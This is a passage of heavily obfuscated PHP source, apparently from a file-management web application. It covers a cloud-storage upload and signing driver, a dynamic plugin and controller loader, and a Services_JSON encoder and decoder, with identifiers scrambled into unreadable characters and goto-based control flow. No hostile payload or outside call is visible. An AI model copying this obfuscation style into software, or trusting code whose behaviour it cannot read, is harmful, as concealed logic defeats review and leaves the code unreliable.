(!isset($BÜ±Ô¹¬[$dˆòÉÍÆÇ‘[195]]) && !empty($F¾™ÊµŞ©Ë)) { $f Ğ£ÂñÍŒ = $this->copyFile($F»…Ê­ÂÊ, $F»…Ê­ÂÊ, array($dˆòÉÍÆÇ‘[184] => $F¾™ÊµŞ©Ë)); $BÜ±Ô¹¬[$dˆòÉÍÆÇ‘[195]] = $f Ğ£ÂñÍŒ ? $F¾™ÊµŞ©Ë : $dˆòÉÍÆÇ‘[33]; } return isset($BÜ±Ô¹¬[$dˆòÉÍÆÇ‘[195]]) ? $BÜ±Ô¹¬[$dˆòÉÍÆÇ‘[195]] : $dˆòÉÍÆÇ‘[33]; } public function fileInfoImage($C›¿Ïˆß…Ò, &$Bô “ï²‚‰) { $F¿Õ‚†ìã =& $_SERVER[ÍÓÖ€°å]; $D‹ÁàÌœ£é = array($F¿Õ‚†ìã[196], $F¿Õ‚†ìã[149], $F¿Õ‚†ìã[197], $F¿Õ‚†ìã[198], $F¿Õ‚†ìã[199]); if (in_array($Bô “ï²‚‰[$F¿Õ‚†ìã[148]], $D‹ÁàÌœ£é)) { $D„®ºÜš–ö = $this->link($C›¿Ïˆß…Ò); $C°‡¦õª¼ = getimagesize($D„®ºÜš–ö); if ($C°‡¦õª¼) { $Bô “ï²‚‰[$F¿Õ‚†ìã[200]] = array($F¿Õ‚†ìã[201] => $C°‡¦õª¼[0], $F¿Õ‚†ìã[202] => $C°‡¦õª¼[1]); } } } public function getObjectInfo($Dßœ¤¿‘ª) { return $this->client->getObjectInfo($this->bucket, $Dßœ¤¿‘ª); } public function uploadFormData($eœ¬ëƒà¿, $Aãğ”é±½† = 3600) { $b‘ƒ†À®½É =& $_SERVER[ÍÓÖ€°å]; $bÕÛöøß© = $this->pathFather($eœ¬ëƒà¿); $F£†´·Ã‚¼ = $this->client->getHttpUploadPostParams($this->bucket, $bÕÛöøß©, $b‘ƒ†À®½É[173], $Aãğ”é±½†); return array_merge((array) $F£†´·Ã‚¼, array($b‘ƒ†À®½É[157] => $this->getHost())); } public function multiUploadFormData($AÊÉî°‘Ï¥, $c…öÒ†±÷ = 3600) { $eÉŒ×›ÎÄ‚ =& $_SERVER[ÍÓÖ€°å]; $eùí…Ó×Ç’ = gmdate($eÉŒ×›ÎÄ‚[203]); $F÷ˆ˜æöõà = array(); $E–“à±Šß = $this->client->getUploadId($this->bucket, $AÊÉî°‘Ï¥, $F÷ˆ˜æöõà); if (!$E–“à±Šß) { return !1; } return array($eÉŒ×›ÎÄ‚[204] => $E–“à±Šß, $eÉŒ×›ÎÄ‚[157] => $this->getHost() . $eÉŒ×›ÎÄ‚[8] . $this->pathEncode($AÊÉî°‘Ï¥), $eÉŒ×›ÎÄ‚[205] => $eùí…Ó×Ç’, $eÉŒ×›ÎÄ‚[88] => $AÊÉî°‘Ï¥); } public function multiUploadAuthData($F× ¡²‘, $EÕ•Ï˜‘ = array()) { goto Bê¦Íİ‹½; A‰Ø³‘äÉ: $Fã‚Ëë¶¥õ = isset($EÕ•Ï˜‘[$F¢ù‚ÅŞë[148]]) ? $EÕ•Ï˜‘[$F¢ù‚ÅŞë[148]] : $F¢ù‚ÅŞë[33]; $e×»Ó¥èìç = $EÕ•Ï˜‘[$F¢ù‚ÅŞë[88]]; unset($EÕ•Ï˜‘[$F¢ù‚ÅŞë[88]]); goto c§ğÜƒñ¿ç; c§ğÜƒñ¿ç: if (isset($EÕ•Ï˜‘[$F¢ù‚ÅŞë[206]])) { return $this->listUploadParts($e×»Ó¥èìç, $EÕ•Ï˜‘); } $cëÀ¹Ÿó = array($F¢ù‚ÅŞë[207], $F¢ù‚ÅŞë[33], $F¢ù‚ÅŞë[105], $F¢ù‚ÅŞë[33], "\170\x2d\x61\155\172\55\x64\x61\164\145\x3a{$bèÃç½‡½Š}", $F¢ù‚ÅŞë[8] . $this->bucket . $F¢ù‚ÅŞë[8] . $this->pathEncode($e×»Ó¥èìç) . $Fã‚Ëë¶¥õ); if (strpos($Fã‚Ëë¶¥õ, $F¢ù‚ÅŞë[208]) === 0) { $cëÀ¹Ÿó[0] = $F¢ù‚ÅŞë[209]; } goto C‚ßù–à®; Bê¦Íİ‹½: $F¢ù‚ÅŞë =& $_SERVER[ÍÓÖ€°å]; $bèÃç½‡½Š = isset($EÕ•Ï˜‘[$F¢ù‚ÅŞë[205]]) ? $EÕ•Ï˜‘[$F¢ù‚ÅŞë[205]] : gmdate($F¢ù‚ÅŞë[203]); $EÕ•Ï˜‘[$F¢ù‚ÅŞë[205]] = $bèÃç½‡½Š; goto A‰Ø³‘äÉ; C‚ßù–à®: if (isset($EÕ•Ï˜‘[$F¢ù‚ÅŞë[210]]) && $EÕ•Ï˜‘[$F¢ù‚ÅŞë[210]] == $F¢ù‚ÅŞë[211]) { $cëÀ¹Ÿó[0] = $F¢ù‚ÅŞë[211]; } $a™«Ÿ¦åå‰ = implode($F¢ù‚ÅŞë[212], $cëÀ¹Ÿó); $d­Œ¹¸¸Ö¸ = base64_encode(hash_hmac($F¢ù‚ÅŞë[213], $a™«Ÿ¦åå‰, $this->secret, !0)); goto EèÈµùªŠˆ; EèÈµùªŠˆ: $A”âÎƒòÃ = $F¢ù‚ÅŞë[214] . $this->accessKey . $F¢ù‚ÅŞë[4] . $d­Œ¹¸¸Ö¸; if (strpos($Fã‚Ëë¶¥õ, $F¢ù‚ÅŞë[208]) === 0) { return array($F¢ù‚ÅŞë[215] => $A”âÎƒòÃ, $F¢ù‚ÅŞë[205] => $bèÃç½‡½Š); } return $A”âÎƒòÃ; goto e™ƒŸÅÆùˆ; e™ƒŸÅÆùˆ: } public function listUploadParts($f„Ç¼­’¯Ş, $eç’ôë³á = array()) { goto fåÍ»…¸œò; E…Ô¤Ğô‡ó: if (!$DŠ¿óĞè†¤) { return !1; } unset($eç’ôë³á[$d Ñ–¯®µá[206]], $eç’ôë³á[$d Ñ–¯®µá[210]]); $eç’ôë³á[$d Ñ–¯®µá[88]] = $f„Ç¼­’¯Ş; goto eˆŒºò; fåÍ»…¸œò: $d Ñ–¯®µá =& $_SERVER[ÍÓÖ€°å]; $Aìï–Ëš§ = str_replace($d Ñ–¯®µá[216], $d Ñ–¯®µá[33], $eç’ôë³á[$d Ñ–¯®µá[148]]); $DŠ¿óĞè†¤ = $this->client->listParts($this->bucket, $f„Ç¼­’¯Ş, $Aìï–Ëš§); goto E…Ô¤Ğô‡ó; eˆŒºò: $Fâ­èÀ»£ç = $this->multiUploadAuthData($f„Ç¼­’¯Ş, $eç’ôë³á); if (empty($Fâ­èÀ»£ç)) { return !1; } return array($d Ñ–¯®µá[215] => $Fâ­èÀ»£ç, $d Ñ–¯®µá[205] => $eç’ôë³á[$d Ñ–¯®µá[205]], $d Ñ–¯®µá[217] => $DŠ¿óĞè†¤); goto E¿ÓæØ¦½Ÿ; E¿ÓæØ¦½Ÿ: } } define($_SERVER[ÍÓÖ€°å][218], 1); goto C¡«Ì‘œ›‹; DÙ„•ø¿„™: function Action($D£Øåàßï = '') { goto A’‘‘×Â¦¥; aéªĞ¹†ê”: $DÙÒÃïÇß = explode($bôÜàÇŞÔ‚[3], $D£Øåàßï); $DğÃ‰Õ‘„Ò = strtolower($DÙÒÃïÇß[0]); if (substr($DğÃ‰Õ‘„Ò, -6) == $bôÜàÇŞÔ‚[4]) { $D£Øåàßï = substr($DÙÒÃïÇß[0], 0, -6); $cØ®­âšù» = $D£Øåàßï . $bôÜàÇŞÔ‚[5]; $A¶Ü’ä§˜¬ = $bôÜàÇŞÔ‚[6]; if (substr(strtolower($DÙÒÃïÇß[1]), -5) == $bôÜàÇŞÔ‚[7]) { $cØ®­âšù» = $D£Øåàßï . $DÙÒÃïÇß[1]; $A¶Ü’ä§˜¬ = $bôÜàÇŞÔ‚[8] . $DÙÒÃïÇß[1] . $bôÜàÇŞÔ‚[9]; } else { if (count($DÙÒÃïÇß) == 3) { $cØ®­âšù» = $D£Øåàßï . $DÙÒÃïÇß[1] . $DÙÒÃïÇß[2]; $A¶Ü’ä§˜¬ = $bôÜàÇŞÔ‚[10] . $DÙÒÃïÇß[1] . $bôÜàÇŞÔ‚[11] . $DÙÒÃïÇß[2] . $bôÜàÇŞÔ‚[9]; } } $A¶Ü’ä§˜¬ = PLUGIN_DIR . $D£Øåàßï . $bôÜàÇŞÔ‚[2] . $A¶Ü’ä§˜¬; } else { if (substr($DğÃ‰Õ‘„Ò, -5) == $bôÜàÇŞÔ‚[7]) { $D£Øåàßï = substr($DÙÒÃïÇß[0], 0, -5); return Model($D£Øåàßï); } else { $cØ®­âšù» = $DÙÒÃïÇß[0] . $DÙÒÃïÇß[1]; $A¶Ü’ä§˜¬ = CONTROLLER_DIR . $DÙÒÃïÇß[0] . $bôÜàÇŞÔ‚[2] . $DÙÒÃïÇß[1] . $bôÜàÇŞÔ‚[12]; } } goto Dí­¸ĞÚÏÅ; A’‘‘×Â¦¥: $bôÜàÇŞÔ‚ =& $_SERVER[ÌˆŞó˜ªµ°]; static $DŠÙØ¬´Á = array(); $D£Øåàßï = trim(str_replace($bôÜàÇŞÔ‚[2], $bôÜàÇŞÔ‚[3], $D£Øåàßï), $bôÜàÇŞÔ‚[2]); goto aéªĞ¹†ê”; Aˆ‚óà§¡: if (!class_exists($cØ®­âšù»)) { return write_log($bôÜàÇŞÔ‚[13] . $D£Øåàßï . $bôÜàÇŞÔ‚[14] . $cØ®­âšù» . $bôÜàÇŞÔ‚[15], $bôÜàÇŞÔ‚[16]); } $DŠÙØ¬´Á[$D‰Äšğ“„°] = new $cØ®­âšù»(); return $DŠÙØ¬´Á[$D‰Äšğ“„°]; goto C‚°³ÒŠá…; Dí­¸ĞÚÏÅ: $D‰Äšğ“„° = strtolower($cØ®­âšù»); if (isset($DŠÙØ¬´Á[$D‰Äšğ“„°])) { return $DŠÙØ¬´Á[$D‰Äšğ“„°]; } if (is_file($A¶Ü’ä§˜¬)) { include_once $A¶Ü’ä§˜¬; } goto Aˆ‚óà§¡; C‚°³ÒŠá…: } function ActionApply($FÂ³œ§ «, $cÉ† æ”ùÙ = array()) { goto eŠËŸº÷Ê; BÃó›ê®Úß: return $Cºš¸Î„£ì; goto e¢ØËª´Áğ; b«Ã¤ãÎ® : $Bí¼«®÷„› = Action($D§£ØŒ’Á¶); if (!method_exists($Bí¼«®÷„›, $D¦õàëÓ„á)) { return write_log($FÂ³œ§ « . $aîÑ¸˜¡ÕÒ[17], $aîÑ¸˜¡ÕÒ[16]); } $Cºš¸Î„£ì = call_user_func_array(array($Bí¼«®÷„›, $D¦õàëÓ„á), $cÉ† æ”ùÙ); goto BÃó›ê®Úß; eŠËŸº÷Ê: $aîÑ¸˜¡ÕÒ =& $_SERVER[ÌˆŞó˜ªµ°]; if (is_array($FÂ³œ§ «)) { return call_user_func_array($FÂ³œ§ «, $cÉ† æ”ùÙ); } if (function_exists($FÂ³œ§ «)) { return call_user_func_array($FÂ³œ§ «, $cÉ† æ”ùÙ); } goto C°²±†¥’¦; C°²±†¥’¦: $A†ğóíÑ = strrpos($FÂ³œ§ «, $aîÑ¸˜¡ÕÒ[3]); $D§£ØŒ’Á¶ = substr($FÂ³œ§ «, 0, $A†ğóíÑ); $D¦õàëÓ„á = substr($FÂ³œ§ «, $A†ğóíÑ + 1); goto b«Ã¤ãÎ® ; e¢ØËª´Áğ: } function ActionCall($f›ØÅŠè¸ö) { $c¨ÎÃ¨ƒË· = array_slice(func_get_args(), 1); return ActionApply($f›ØÅŠè¸ö, $c¨ÎÃ¨ƒË·); } goto EÅ‘ê‘Ü; B„‘š‚ùË¶: define($_SERVER[ÍÓÖ€°å][1304], 16); define($_SERVER[ÍÓÖ€°å][1305], 32); class Services_JSON { function __construct($E«ßà –¬ = 0) { $this->use = $E«ßà –¬; } function utf162utf8($e£Šß§¼·±) { $e—è ÓÛ½™ =& $_SERVER[ÍÓÖ€°å]; if (function_exists($e—è ÓÛ½™[69])) { return mb_convert_encoding($e£Šß§¼·±, $e—è ÓÛ½™[1306], $e—è ÓÛ½™[1307]); } $dŠÑ§¢¶Ï = ord($e£Šß§¼·±[0]) << 8 | ord($e£Šß§¼·±[1]); switch (!0) { case (127 & $dŠÑ§¢¶Ï) == $dŠÑ§¢¶Ï: return chr(127 & $dŠÑ§¢¶Ï); case (2047 & $dŠÑ§¢¶Ï) == $dŠÑ§¢¶Ï: return chr(192 | $dŠÑ§¢¶Ï >> 6 & 31) . chr(128 | $dŠÑ§¢¶Ï & 63); case (65535 & $dŠÑ§¢¶Ï) == $dŠÑ§¢¶Ï: return chr(224 | $dŠÑ§¢¶Ï >> 12 & 15) . chr(128 | $dŠÑ§¢¶Ï >> 6 & 63) . chr(128 | $dŠÑ§¢¶Ï & 63); } return $e—è ÓÛ½™[33]; } function utf82utf16($Cä‚Û›ÌĞ”) { $DÈĞç„°À =& $_SERVER[ÍÓÖ€°å]; if (function_exists($DÈĞç„°À[69])) { return mb_convert_encoding($Cä‚Û›ÌĞ”, $DÈĞç„°À[1307], $DÈĞç„°À[1306]); } switch (strlen($Cä‚Û›ÌĞ”)) { case 1: return $Cä‚Û›ÌĞ”; case 2: return chr(7 & ord($Cä‚Û›ÌĞ”[0]) >> 2) . chr(192 & ord($Cä‚Û›ÌĞ”[0]) << 6 | 63 & ord($Cä‚Û›ÌĞ”[1])); case 3: return chr(240 & ord($Cä‚Û›ÌĞ”[0]) << 4 | 15 & ord($Cä‚Û›ÌĞ”[1]) >> 2) . chr(192 & ord($Cä‚Û›ÌĞ”[1]) << 6 | 127 & ord($Cä‚Û›ÌĞ”[2])); } return $DÈĞç„°À[33]; } function encode($EæºÛ†‰Ûï) { $EöàíÅÎÚÊ =& $_SERVER[ÍÓÖ€°å]; switch (gettype($EæºÛ†‰Ûï)) { case $EöàíÅÎÚÊ[1308]: return $EæºÛ†‰Ûï ? $EöàíÅÎÚÊ[1309] : $EöàíÅÎÚÊ[1310]; case $EöàíÅÎÚÊ[1311]: return $EöàíÅÎÚÊ[98]; case $EöàíÅÎÚÊ[295]: return (int) $EæºÛ†‰Ûï; case $EöàíÅÎÚÊ[270]: case $EöàíÅÎÚÊ[269]: return (double) $EæºÛ†‰Ûï; case $EöàíÅÎÚÊ[304]: $Cœ·¬îÕó‘ = $EöàíÅÎÚÊ[33]; $BíŠ‚Ä¦á = strlen($EæºÛ†‰Ûï); for ($fêÜŒƒ†˜” = 0; $fêÜŒƒ†˜” < $BíŠ‚Ä¦á; ++$fêÜŒƒ†˜”) { $aŸçÛ¢ÏèÃ = ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜”]); switch (!0) { case $aŸçÛ¢ÏèÃ == 8: $Cœ·¬îÕó‘ .= $EöàíÅÎÚÊ[1312]; break; case $aŸçÛ¢ÏèÃ == 9: $Cœ·¬îÕó‘ .= $EöàíÅÎÚÊ[1313]; break; case $aŸçÛ¢ÏèÃ == 10: $Cœ·¬îÕó‘ .= $EöàíÅÎÚÊ[1314]; break; case $aŸçÛ¢ÏèÃ == 12: $Cœ·¬îÕó‘ .= $EöàíÅÎÚÊ[1315]; break; case $aŸçÛ¢ÏèÃ == 13: $Cœ·¬îÕó‘ .= $EöàíÅÎÚÊ[1316]; break; case $aŸçÛ¢ÏèÃ == 34: case $aŸçÛ¢ÏèÃ == 47: case $aŸçÛ¢ÏèÃ == 92: $Cœ·¬îÕó‘ .= $EöàíÅÎÚÊ[92] . $EæºÛ†‰Ûï[$fêÜŒƒ†˜”]; break; case $aŸçÛ¢ÏèÃ >= 32 && $aŸçÛ¢ÏèÃ <= 127: $Cœ·¬îÕó‘ .= $EæºÛ†‰Ûï[$fêÜŒƒ†˜”]; break; case ($aŸçÛ¢ÏèÃ & 224) == 192: $AÕ§Ê¢³• = pack($EöàíÅÎÚÊ[1317], $aŸçÛ¢ÏèÃ, ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 1])); $fêÜŒƒ†˜” += 1; $F‡®ŠäÓğ› = $this->utf82utf16($AÕ§Ê¢³•); $Cœ·¬îÕó‘ .= sprintf($EöàíÅÎÚÊ[1318], bin2hex($F‡®ŠäÓğ›)); break; case ($aŸçÛ¢ÏèÃ & 240) == 224: $AÕ§Ê¢³• = pack($EöàíÅÎÚÊ[1317], $aŸçÛ¢ÏèÃ, ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 1]), ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 2])); $fêÜŒƒ†˜” += 2; $F‡®ŠäÓğ› = $this->utf82utf16($AÕ§Ê¢³•); $Cœ·¬îÕó‘ .= sprintf($EöàíÅÎÚÊ[1318], bin2hex($F‡®ŠäÓğ›)); break; case ($aŸçÛ¢ÏèÃ & 248) == 240: $AÕ§Ê¢³• = pack($EöàíÅÎÚÊ[1317], $aŸçÛ¢ÏèÃ, ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 1]), ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 2]), ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 3])); $fêÜŒƒ†˜” += 3; $F‡®ŠäÓğ› = $this->utf82utf16($AÕ§Ê¢³•); $Cœ·¬îÕó‘ .= sprintf($EöàíÅÎÚÊ[1318], bin2hex($F‡®ŠäÓğ›)); break; case ($aŸçÛ¢ÏèÃ & 252) == 248: $AÕ§Ê¢³• = pack($EöàíÅÎÚÊ[1317], $aŸçÛ¢ÏèÃ, ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 1]), ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 2]), ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 3]), ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 4])); $fêÜŒƒ†˜” += 4; $F‡®ŠäÓğ› = $this->utf82utf16($AÕ§Ê¢³•); $Cœ·¬îÕó‘ .= sprintf($EöàíÅÎÚÊ[1318], bin2hex($F‡®ŠäÓğ›)); break; case ($aŸçÛ¢ÏèÃ & 254) == 252: $AÕ§Ê¢³• = pack($EöàíÅÎÚÊ[1317], $aŸçÛ¢ÏèÃ, ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 1]), ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 2]), ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 3]), ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 4]), ord($EæºÛ†‰Ûï[$fêÜŒƒ†˜” + 5])); $fêÜŒƒ†˜” += 5; $F‡®ŠäÓğ› = $this->utf82utf16($AÕ§Ê¢³•); $Cœ·¬îÕó‘ .= sprintf($EöàíÅÎÚÊ[1318], bin2hex($F‡®ŠäÓğ›)); break; } } return $EöàíÅÎÚÊ[102] . $Cœ·¬îÕó‘ . $EöàíÅÎÚÊ[102]; case $EöàíÅÎÚÊ[1319]: if (is_array($EæºÛ†‰Ûï) && count($EæºÛ†‰Ûï) && array_keys($EæºÛ†‰Ûï) !== range(0, sizeof($EæºÛ†‰Ûï) - 1)) { $eªí“õŸĞè = array_map(array($this, $EöàíÅÎÚÊ[1320]), array_keys($EæºÛ†‰Ûï), array_values($EæºÛ†‰Ûï)); foreach ($eªí“õŸĞè as $a¶ÑÈØ•Û‡) { if (Services_JSON::isError($a¶ÑÈØ•Û‡)) { return $a¶ÑÈØ•Û‡; } } return $EöàíÅÎÚÊ[790] . join($EöàíÅÎÚÊ[47], $eªí“õŸĞè) . $EöàíÅÎÚÊ[307]; } $B‚‘ñ©æÜ¥ = array_map(array($this, $EöàíÅÎÚÊ[1321]), $EæºÛ†‰Ûï); foreach ($B‚‘ñ©æÜ¥ as $aÆè“ØÀ‚‹) { if (Services_JSON::isError($aÆè“ØÀ‚‹)) { return $aÆè“ØÀ‚‹; } } return $EöàíÅÎÚÊ[1322] . join($EöàíÅÎÚÊ[47], $B‚‘ñ©æÜ¥) . $EöàíÅÎÚÊ[1323]; case $EöàíÅÎÚÊ[1324]: $a÷Ø±‹ï‰ó = get_object_vars($EæºÛ†‰Ûï); $eªí“õŸĞè = array_map(array($this, $EöàíÅÎÚÊ[1320]), array_keys($a÷Ø±‹ï‰ó), array_values($a÷Ø±‹ï‰ó)); foreach ($eªí“õŸĞè as $a¶ÑÈØ•Û‡) { if (Services_JSON::isError($a¶ÑÈØ•Û‡)) { return $a¶ÑÈØ•Û‡; } } return $EöàíÅÎÚÊ[790] . join($EöàíÅÎÚÊ[47], $eªí“õŸĞè) . $EöàíÅÎÚÊ[307]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $EöàíÅÎÚÊ[98] : new Services_JSON_Error(gettype($EæºÛ†‰Ûï) . $EöàíÅÎÚÊ[1325]); } } function name_value($c­¥–ëø‚, $E‡±ë—ÅÇ) { $b†³âˆ—Ó  = $this->encode($E‡±ë—ÅÇ); if (Services_JSON::isError($b†³âˆ—Ó )) { return $b†³âˆ—Ó ; } return $this->encode(strval($c­¥–ëø‚)) . $_SERVER[ÍÓÖ€°å][4] . $b†³âˆ—Ó ; } function reduce_string($aøîî©Ô¯á) { $b™‰®›‰²æ =& $_SERVER[ÍÓÖ€°å]; $aøîî©Ô¯á = preg_replace(array($b™‰®›‰²æ[1326], $b™‰®›‰²æ[1327], $b™‰®›‰²æ[1328]), $b™‰®›‰²æ[33], $aøîî©Ô¯á); return trim($aøîî©Ô¯á); } function decode($DÒ¯ƒí´¡ß) { $cÀ×´áåîÛ =& $_SERVER[ÍÓÖ€°å]; $DÒ¯ƒí´¡ß = $this->reduce_string($DÒ¯ƒí´¡ß); switch (strtolower($DÒ¯ƒí´¡ß)) { case $cÀ×´áåîÛ[1309]: return !0; case $cÀ×´áåîÛ[1310]: return !1; case $cÀ×´áåîÛ[98]: return null; default: $D¬¦ˆ¹×‹– = array(); if (is_numeric($DÒ¯ƒí´¡ß)) { return (double) $DÒ¯ƒí´¡ß == (int) $DÒ¯ƒí´¡ß ? (int) $DÒ¯ƒí´¡ß : (double) $DÒ¯ƒí´¡ß; } elseif (preg_match($cÀ×´áåîÛ[1329], $DÒ¯ƒí´¡ß, $D¬¦ˆ¹×‹–) && $D¬¦ˆ¹×‹–[1] == $D¬¦ˆ¹×‹–[2]) { $CìÙ´ÑÁ›Ó = substr($DÒ¯ƒí´¡ß, 0, 1); $aó„Ö›¥ğô = substr($DÒ¯ƒí´¡ß, 1, -1); $c´Ô¯©ùï­ = $cÀ×´áåîÛ[33]; $dÈ–á‰ßöÅ = strlen($aó„Ö›¥ğô); for ($D‡©¼‘óŒŞ = 0; $D‡©¼‘óŒŞ < $dÈ–á‰ßöÅ; ++$D‡©¼‘óŒŞ) { $bÏ·›„™÷İ = substr($aó„Ö›¥ğô, $D‡©¼‘óŒŞ, 2); $EŒì¬÷ª´Ğ = ord($aó„Ö›¥ğô[$D‡©¼‘óŒŞ]); switch (!0) { case $bÏ·›„™÷İ == $cÀ×´áåîÛ[1312]: $c´Ô¯©ùï­ .= chr(8); ++$D‡©¼‘óŒŞ; break; case $bÏ·›„™÷İ == $cÀ×´áåîÛ[1313]: $c´Ô¯©ùï­ .= chr(9); ++$D‡©¼‘óŒŞ; break; case $bÏ·›„™÷İ == $cÀ×´áåîÛ[1314]: $c´Ô¯©ùï­ .= chr(10); ++$D‡©¼‘óŒŞ; break; case $bÏ·›„™÷İ == $cÀ×´áåîÛ[1315]: $c´Ô¯©ùï­ .= chr(12); ++$D‡©¼‘óŒŞ; break; case $bÏ·›„™÷İ == $cÀ×´áåîÛ[1316]: $c´Ô¯©ùï­ .= chr(13); ++$D‡©¼‘óŒŞ; break; case $bÏ·›„™÷İ == $cÀ×´áåîÛ[980]: case $bÏ·›„™÷İ == $cÀ×´áåîÛ[1330]: case $bÏ·›„™÷İ == $cÀ×´áåîÛ[1331]: case $bÏ·›„™÷İ == $cÀ×´áåîÛ[1332]: if ($CìÙ´ÑÁ›Ó == $cÀ×´áåîÛ[102] && $bÏ·›„™÷İ != $cÀ×´áåîÛ[1330] || $CìÙ´ÑÁ›Ó == $cÀ×´áåîÛ[55] && $bÏ·›„™÷İ != $cÀ×´áåîÛ[980]) { $c´Ô¯©ùï­ .= $aó„Ö›¥ğô[++$D‡©¼‘óŒŞ]; } break; case preg_match($cÀ×´áåîÛ[1333], substr($aó„Ö›¥ğô, $D‡©¼‘óŒŞ, 6)): $D²÷ó³öï¦ = chr(hexdec(substr($aó„Ö›¥ğô, $D‡©¼‘óŒŞ + 2, 2))) . chr(hexdec(substr($aó„Ö›¥ğô, $D‡©¼‘óŒŞ + 4, 2))); $c´Ô¯©ùï­ .= $this->utf162utf8($D²÷ó³öï¦); $D‡©¼‘óŒŞ += 5; break; case $EŒì¬÷ª´Ğ >= 32 && $EŒì¬÷ª´Ğ <= 127: $c´Ô¯©ùï­ .= $aó„Ö›¥ğô[$D‡©¼‘óŒŞ]; break; case ($EŒì¬÷ª´Ğ & 224) == 192: $c´Ô¯©ùï­ .= substr($aó„Ö›¥ğô, $D‡©¼‘óŒŞ, 2); ++$D‡©¼‘óŒŞ; break; case ($EŒì¬÷ª´Ğ & 240) == 224: $c´Ô¯©ùï­ .= substr($aó„Ö›¥ğô, $D‡©¼‘óŒŞ, 3); $D‡©¼‘óŒŞ += 2; break; case ($EŒì¬÷ª´Ğ & 248) == 240: $c´Ô¯©ùï­ .= substr($aó„Ö›¥ğô, $D‡©¼‘óŒŞ, 4); $D‡©¼‘óŒŞ += 3; break; case ($EŒì¬÷ª´Ğ & 252) == 248: $c´Ô¯©ùï­ .= substr($aó„Ö›¥ğô, $D‡©¼‘óŒŞ, 5); $D‡©¼‘óŒŞ += 4; break; case ($EŒì¬÷ª´Ğ & 254) == 252: $c´Ô¯©ùï­ .= substr($aó„Ö›¥ğô, $D‡©¼‘óŒŞ, 6); $D‡©¼‘óŒŞ += 5; break; } } return $c´Ô¯©ùï­; } elseif (preg_match($cÀ×´áåîÛ[1334], $DÒ¯ƒí´¡ß) || preg_match($cÀ×´áåîÛ[1335], $DÒ¯ƒí´¡ß)) { goto A‹„Ô¾¹»İ; Fô«„²ÕÒœ: for ($D‡©¼‘óŒŞ = 0; $D‡©¼‘óŒŞ <= $dÈ–á‰ßöÅ; ++$D‡©¼‘óŒŞ) { $CÃ‹îË²®‰ = end($Aà˜Éƒ©Ö); $bÏ·›„™÷İ = substr($aó„Ö›¥ğô, $D‡©¼‘óŒŞ, 2); if ($D‡©¼‘óŒŞ == $dÈ–á‰ßöÅ || $aó„Ö›¥ğô[$D‡©¼‘óŒŞ] == $cÀ×´áåîÛ[47] && $CÃ‹îË²®‰[$cÀ×´áåîÛ[1336]] == SERVICES_JSON_SLICE) { $BÉ‘†Óæ•¯ = substr($aó„Ö›¥ğô, $CÃ‹îË²®‰[$cÀ×´áåîÛ[255]], $D‡©¼‘óŒŞ - $CÃ‹îË²®‰[$cÀ×´áåîÛ[255]]); array_push($Aà˜Éƒ©Ö, array($cÀ×´áåîÛ[1336] => SERVICES_JSON_SLICE, $cÀ×´áåîÛ[255] => $D‡©¼‘óŒŞ + 1, $cÀ×´áåîÛ[1337] => !1)); if (reset($Aà˜Éƒ©Ö) == SERVICES_JSON_IN_ARR) { array_push($d¼¯–¹ñ‘Æ, $this->decode($BÉ‘†Óæ•¯)); } elseif (reset($Aà˜Éƒ©Ö) == SERVICES_JSON_IN_OBJ) { $fçƒŒ– ¨ = array(); if (preg_match($cÀ×´áåîÛ[1338], $BÉ‘†Óæ•¯, $fçƒŒ– ¨)) { $FˆãÙÔÓø = $this->decode($fçƒŒ– ¨[1]); $c…ÅÁ…ÖÑ° = $this->decode($fçƒŒ– ¨[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $dïôËŞÄµ¤[$FˆãÙÔÓø] = $c…ÅÁ…ÖÑ°; } else { $dïôËŞÄµ¤->{$FˆãÙÔÓø} = $c…ÅÁ…ÖÑ°; } } elseif (preg_match($cÀ×´áåîÛ[1339], $BÉ‘†Óæ•¯, $fçƒŒ– ¨)) { $FˆãÙÔÓø = $fçƒŒ– ¨[1]; $c…ÅÁ…ÖÑ° = $this->decode($fçƒŒ– ¨[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $dïôËŞÄµ¤[$FˆãÙÔÓø] = $c…ÅÁ…ÖÑ°; } else { $dïôËŞÄµ¤->{$FˆãÙÔÓø} = $c…ÅÁ…ÖÑ°; } } } } elseif (($aó„Ö›¥ğô[$D‡©¼‘óŒŞ] == $cÀ×´áåîÛ[102] || $aó„Ö›¥ğô[$D‡©¼‘óŒŞ] == $cÀ×´áåîÛ[55]) && $CÃ‹îË²®‰[$cÀ×´áåîÛ[1336]] != SERVICES_JSON_IN_STR) { array_push($Aà˜Éƒ©Ö, array($cÀ×´áåîÛ[1336] => SERVICES_JSON_IN_STR, $cÀ×´áåîÛ[255] => $D‡©¼‘óŒŞ, $cÀ×´áåîÛ[1337] => $aó„Ö›¥ğô[$D‡©¼‘óŒŞ])); } elseif ($aó„Ö›¥ğô[$D‡©¼‘óŒŞ] == $CÃ‹îË²®‰[$cÀ×´áåîÛ[1337]] && $CÃ‹îË²®‰[$cÀ×´áåîÛ[1336]] == SERVICES_JSON_IN_STR && (strlen(substr($aó„Ö›¥ğô, 0, $D‡©¼‘óŒŞ)) - strlen(rtrim(substr($aó„Ö›¥ğô, 0, $D‡©¼‘óŒŞ), $cÀ×´áåîÛ[92]))) % 2 != 1) { array_pop($Aà˜Éƒ©Ö); } elseif ($aó„Ö›¥ğô[$D‡©¼‘óŒŞ] == $cÀ×´áåîÛ[1322] && in_array($CÃ‹îË²®‰[$cÀ×´áåîÛ[1336]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($Aà˜Éƒ©Ö, 